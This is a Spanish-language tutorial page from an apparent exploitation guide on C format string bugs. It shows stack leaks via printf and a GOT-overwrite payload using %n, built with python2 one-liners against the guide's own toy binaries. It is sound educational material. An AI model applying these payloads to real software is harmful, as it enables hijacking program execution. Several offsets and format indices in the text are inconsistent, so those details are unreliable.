---
layout: default
title: Format String Bug
grand_parent: Tipos de errores
parent: Errores relacionados con la seguridad espacial
nav_order: 4
---

# Format String Bug
{: .no_toc }

## Conocimientos necesarios
{: .no_toc .text-delta }

Antes de comenzar con esta sección, es recomendable que leas las siguientes
secciones de la guía si aún no las has leído:

[Stack](../../conceptos/stack.html){: .btn .btn-green }
[Calling Conventions](../../conceptos/calling_conventions.html){: .btn .btn-green }
[Global Offset Table](../../conceptos/got.html){: .btn .btn-green }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Información General

En el lenguaje C hay algunas funciones que utilizan un string que indica el
formato en el que deben realizar ciertas operaciones.

Algunos ejemplos de este tipo de funciones son las funciones scanf y printf.

Un format string bug consiste en permitir que el input del usuario sea
utilizado como format string para alguna de estas funciones.

---

## Ejemplo

Iniciemos con el siguiente código:

```c
#include <stdio.h>

char* secreto = "Este string es secreto y nadie debe verlo";

void vuln() {
  char input[8];
  char* secret_ptr = secreto;

  printf("Ingrese su input: ");
  fgets(input, 8, stdin);

  printf(input);
}

int main() {
  vuln();
}
```

Para este ejemplo, trabajaremos como si hubiera sido compilado para linux
32 bits.

Observemos que el programa utiliza la función printf para imprimir el input
que le demos.

Recordemos que el primer argumento que recibe la función printf es un
string para representar el formato de lo que queremos imprimir. Por
ejemplo, si quisiéramos imprimir un entero, lo haríamos de la siguiente
forma:

```c
printf("%d\n", 1337);
```

Le pasamos el formato %d para indicar que queremos imprimir un entero, y
como segundo argumento le damos el entero que queremos que imprima.

Con esto en mente, ¿qué pasaría si le pasamos a nuestro programa el formato
%d?. Le estaríamos indicando que queremos imprimir un entero, pero no le
pasamos el entero a imprimir como argumento. Veamos lo que sucede:

```
Ingrese su input: %d
8
```

Al ingresar como input un "%d", el programa nos imprime un 8. Ahora la pregunta
es, ¿qué significa ese número?.

Para entenderlo, primero recordemos que el binario fue compilado para 32
bits, por lo que los argumentos se le pasan a una función a través del
stack. Veamos cómo sería el stack para la función vuln.

Primero veamos el ensamblador generado para entender cómo sería el stack
resultante (Solo nos enfocaremos en las líneas que no están comentadas):

```nasm
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0x14                              ; reservando espacio para variables
; call   0x10a0 <__x86.get_pc_thunk.bx>
; add    ebx,0x2e4b
; mov    eax,DWORD PTR [ebx+0x20]
mov    DWORD PTR [ebp-0xc],eax               ; VARIABLE secret_ptr
; sub    esp,0xc
; lea    eax,[ebx-0x1fc2]
; push   eax
; call   0x1040 <printf@plt>
; add    esp,0x10
; mov    eax,DWORD PTR [ebx-0xc]
; mov    eax,DWORD PTR [eax]
; sub    esp,0x4
push   eax
push   0x8
lea    eax,[ebp-0x14]                        ; VARIABLE input
push   eax
call   0x1050 <fgets@plt>                    ; lectura de input
add    esp,0x10
sub    esp,0xc
lea    eax,[ebp-0x14]                        ; VARIABLE input
push   eax
call   0x1040 <printf@plt>
; add    esp,0x10
; nop
; mov    ebx,DWORD PTR [ebp-0x4]
; leave
; ret
```

Lo importante a destacar es que reserva 0x14 bytes para nuestras
variables locales y que guarda la variable input en ebp-0x14
y la variable secret_ptr en ebp-0x14.

| Direcciones relativas  | Nombres        | Stack       | Registros   |
|:-----------------------|:---------------|:------------|:------------|
| ebp-0x14               | input          | ?           | <- esp      |
| ebp-0x10               | input          | ?           |             |
| ebp-0xc                | secret_ptr     | ?           |             |
| ebp-0x8                | ?              | ?           |             |
| ebp-0x4                | ?              | ?           |             |
| ebp                    | ebp guardado   | ?           | <- ebp      |
| ebp+0x4                | return address | ?           |             |

Ahora veamos cómo se vería el stack al llamar a la función printf.

| Direcciones relativas  | Nombres        | Stack       | Registros   |
|:-----------------------|:---------------|:------------|:------------|
| ebp-...                | ?              | ?           |             |
| ebp                    | ebp guardado   | ?           | <- ebp      |
| ebp+0x4                | return address | ?           |             |
| ebp+0x8                | ?              | ?           |             |
| ebp+0xc                | ?              | ?           |             |
| ebp+0x10               | ?              | ?           |             |
| ebp+0x14               | ?              | ?           |             |
| ebp+0x18               | ?              | ?           |             |
| ebp+0x1c               | input          | ?           |             |
| ebp+0x20               | input          | ?           |             |
| ebp+0x24               | secret_ptr     | ?           |             |
| ebp+0x28               | ?              | ?           |             |
| ebp+0x2c               | ?              | ?           |             |
| ebp+0x30               | ebp guardado   | ?           |             |
| ebp+0x3c               | return address | ?           |             |

Ahora que tenemos una vista general de cómo es el stack, podemos
empezar a entender por qué el programa imprimió 8 cuando le pasamos
un %d. Debido a que en 32 bits los parámetros se pasan a una función
mediante el stack, el primer valor que la función printf utiliza como
argumento es ebp+0x8. Si recordamos, el primer y único argumento
que le pasamos a la función printf fue nuestro input, lo que significa
que en ebp+8 debe estar nuestro input.

| Direcciones relativas  | Nombres        | Stack       | Registros   |
|:-----------------------|:---------------|:------------|:------------|
| ebp-...                | ?              | ?           |             |
| ebp                    | ebp guardado   | ?           | <- ebp      |
| ebp+0x4                | return address | ?           |             |
| ebp+0x8                | &input         | ?           |             |
| ebp+0xc                | ?              | ?           |             |
| ebp+0x10               | ?              | ?           |             |
| ebp+0x14               | ?              | ?           |             |
| ebp+0x18               | ?              | ?           |             |
| ebp+0x1c               | input          | ?           |             |
| ebp+0x20               | input          | ?           |             |
| ebp+0x24               | secret_ptr     | ?           |             |
| ebp+0x28               | ?              | ?           |             |
| ebp+0x2c               | ?              | ?           |             |
| ebp+0x30               | ebp guardado   | ?           |             |
| ebp+0x3c               | return address | ?           |             |

Entonces, cuando nosotros pasamos el string "%d" a nuestro programa, el
primer argumento era nuestro formato "%d". Este formato imprimió el
segundo argumento como un entero. Debido al calling convention sabemos
que la función printf tomó como segundo argumento ebp+0xc. Como el programa
imprimió un 8, podemos concluir que en ebp+0xc hay un valor 8 almacenado.

| Direcciones relativas  | Nombres        | Stack       | Registros   |
|:-----------------------|:---------------|:------------|:------------|
| ebp-...                | ?              | ?           |             |
| ebp                    | ebp guardado   | ?           | <- ebp      |
| ebp+0x4                | return address | ?           |             |
| ebp+0x8                | &input         | ?           |             |
| ebp+0xc                | 8              | 0x00000008  |             |
| ebp+0x10               | ?              | ?           |             |
| ebp+0x14               | ?              | ?           |             |
| ebp+0x18               | ?              | ?           |             |
| ebp+0x1c               | input          | ?           |             |
| ebp+0x20               | input          | ?           |             |
| ebp+0x24               | secret_ptr     | ?           |             |
| ebp+0x28               | ?              | ?           |             |
| ebp+0x2c               | ?              | ?           |             |
| ebp+0x30               | ebp guardado   | ?           |             |
| ebp+0x3c               | return address | ?           |             |

Si quisiéramos ver el stack como una lista de argumentos para printf,
se vería de la siguiente forma:

| Argumentos             | Nombres        | Stack       | Registros   |
|:-----------------------|:---------------|:------------|:------------|
|                        | ?              | ?           |             |
|                        | ebp guardado   | ?           | <- ebp      |
|                        | return address | ?           |             |
| arg1                   | &input         | ?           |             |
| arg2                   | 8              | 0x00000008  |             |
| arg3                   | ?              | ?           |             |
| arg4                   | ?              | ?           |             |
| arg5                   | ?              | ?           |             |
| arg6                   | input          | ?           |             |
| arg7                   | input          | ?           |             |
| arg8                   | secret_ptr     | ?           |             |
| arg9                   | ?              | ?           |             |
| arg10                  | ?              | ?           |             |
| arg11                  | ebp guardado   | ?           |             |
| arg12                  | return address | ?           |             |

En un format string podemos especificar el argumento que queremos imprimir.
Por ejemplo, si queremos imprimir el arg2 como entero, el formato sería
"%1$d". Intentemos imprimir el valor de secret_ptr con esto en mente.

```
Ingrese su input: %7$d
1448841224
```

Vemos que nos imprime el valor de secret_ptr como entero. Sin embargo,
sabemos que secret_ptr es un pointer a un string, por lo que para
ver su contenido como string, debemos usar el formato %s.

```
Ingrese su input: %7$s
Este string es secreto y nadie debe verlo
```

Con este format string bug conseguimos obtener información de los datos
guardados en el stack.

---

## Write-what-where Condition

La función printf tiene un formato que permite escribir en una
dirección de memoria la cantidad de caracteres que ha imprimido hasta
el momento. Este formato es %n.

Veamos el siguiente código:

```c
#include <stdio.h>

int main() {
  int escrito = 0;

  printf("12345678%nESTO_ES_IGNORADO\n", &escrito);

  printf("%d\n", escrito);
}
```

Salida:

```
12345678ESTO_ES_IGNORADO
8
```

Observamos que solo la cantidad de caracteres impresos hasta el momento de llegar
al formato %n son guardados en la variable `escrito`.

Esto significa que con un format string bug tenemos la capacidad de escribir
cualquier valor en cualquier dirección de memoria.

Veamos el siguiente código:

```c
#include <stdio.h>

void win() {
  puts("GOT modificado correctamente");
}

void vuln() {
  char input[160];

  printf("Ingrese su input: ");
  fgets(input, 160, stdin);

  printf(input);
  fgets(input, 160, stdin);
}

int main() {
  vuln();
}
```

Nuestro objetivo en este programa será utilizar un Write-what-where Condition
para lograr ejecutar la función win. Para hacerlo, debemos recordar la global
offset table. Recordemos que las funciones fgets, printf y puts que
utilizamos en nuestro programa están definidas en una librería externa, y
que en la global offset table se guarda la dirección de estas funciones. Esto
significa que podemos cambiar la global offset table para modificar la dirección
de alguna de estas funciones por la dirección de la función win.

Sabemos que con %n podemos escribir en una dirección, por lo que primero
debemos elegir la dirección en la que queremos escribir.

En este caso, modificaremos la dirección de la función fgets en la global
offset table. Podemos obtener esta dirección con el programa readelf:

```
$ readelf -r ptf_w | grep fgets
0804c008  00000307 R_386_JUMP_SLOT   00000000   fgets@GLIBC_2.0
```

En la penúltima línea podemos ver que la dirección en la global offset
table de fgets es 0x0804c008.

Ahora vamos a utilizar nuestro input para guardar esa dirección en el stack.

Primero debemos identificar en cuál argumento la función printf empieza a
utilizar nuestro input. Podríamos identificar esto cuál argumento es analizando
el stack como hicimos en el ejemplo anterior, pero también podemos
ingresar el formato AAAA%n$x hasta que el programa nos imprima 41414141 (AAAA).

Prueba arg2
{: .label .label-purple }

```
Ingrese su input: AAAA%1$x
AAAAa0
```

Prueba arg3
{: .label .label-purple }

```
Ingrese su input: %2$x
f7e1c5c0
```

Prueba arg4
{: .label .label-purple }

```
Ingrese su input: AAAA%3$x
AAAA565da1e7
```

Prueba arg5
{: .label .label-purple }

```
Ingrese su input: AAAA%4$x
AAAA41414141
```

Observamos que la función printf empieza a utilizar nuestro input
a partir de su quinto argumento.

Ahora cambiemos nuestras AAAA por la dirección en la global offset table
de fgets. Podemos utilizar python2 para enviar los bytes de la función
como input.

En este caso, nuestro programa utiliza little endian, por lo que debemos
escribir los bytes de la dirección en el orden apropiado.

```
$ python2 -c "print b'%5\$x\x08\xc0\x04\x08'" | ./ptf_w
Ingrese su input: 804c008
```

Observamos que el formato %6$x imprimió correctamente la dirección que
colocamos al final de nuestro format string.

Intentemos utilizar %n para escribir en nuestra dirección de memoria.

```
$ python2 -c "print b'%5\$n\x08\xc0\x04\x08'" | ./ptf_w
Segmentation fault
```

Vemos que el programa truena debido a que cambiamos la dirección de la
función fgets por un 0, lo que ocasionó que el programa falle al
intentar llamar a la función fgets.

```c
#include <stdio.h>

void win() {
  puts("GOT modificado correctamente");
}

void vuln() {
  char input[160];

  printf("Ingrese su input: ");
  fgets(input, 160, stdin);

  printf(input);
  fgets(input, 160, stdin); // <---- Falló aquí
}

int main() {
  vuln();
}
```

Para lograr nuestro objetivo, tenemos que ver la dirección de la
función win para poder escribirla en la global offset table.

Con readelf podemos obtener esta dirección.

```
$ readelf -s ptf_w | grep win
    34: 08049176    43 FUNC    GLOBAL DEFAULT   13 win
```

Vemos que la dirección de la función win es 0x08049176.

Recordemos que %n escribe en una dirección la cantidad de caracteres
que se han imprimido hasta el momento. Para escribir la dirección 0x08049176
en la global offset table, tenemos que hacer que printf imprima 0x08049176 (134517110)
caracteres antes. Podemos usar el formato %134517110c para lograr esto.

```
$ python2 -c "print b'%134517110c%8\$n-\x08\xc0\x04\x08'" | ./ptf_w
Ingrese su input:                                                                                                                                                                                                                                                                                                                                                 (output recortado)-
GOT modificado correctamente
```

De esta forma logramos hacer que se ejecute la función win.

---

## Mitigaciones
Los siguientes mecanismos de seguridad dificultan o impiden el uso de esta
técnica:

[RELRO](../../mecanismos_seguridad/relro.html){: .btn .btn-green }
[PIE](../../mecanismos_seguridad/pie.html){: .btn .btn-green }

## Retos

---

### fmt1

Al igual que es posible escribir en cualquier dirección de memoria con
el format string, también es posible imprimir lo que hay en cualquier
dirección de memoria.

Archivos:

[fmt1](../../retos/fmt/fmt1.zip){: .btn .btn-blue }
